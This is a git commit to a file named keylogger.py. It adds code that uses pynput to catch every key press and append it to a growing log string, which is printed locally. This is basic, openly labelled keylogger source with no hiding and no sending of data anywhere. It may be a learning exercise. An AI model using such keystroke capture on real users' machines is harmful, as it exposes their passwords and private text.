a027464f1b01c5e5e67b7910bfbcbf6dc412d66f
JinethBosilu <157296244+JinethBosilu@users.noreply.github.com>
2026-02-13 21:05:22 +0530

    Implement key logging functionality and update log handling

--- keylogger.py
+++ keylogger.py
@@ -1,7 +1,17 @@
 import pynput.keyboard
 
+log = ""
+
 def process_key_press(key):
-    print(key)
+    global log
+    try:
+        log += key.char 
+        print(log)
+    except AttributeError:
+        if key == key.space:
+            log += " "
+        else:
+            log += " " + str(key) + " "
 
 keyboard_listner = pynput.keyboard.Listener(on_press=process_key_press)
 with keyboard_listner:
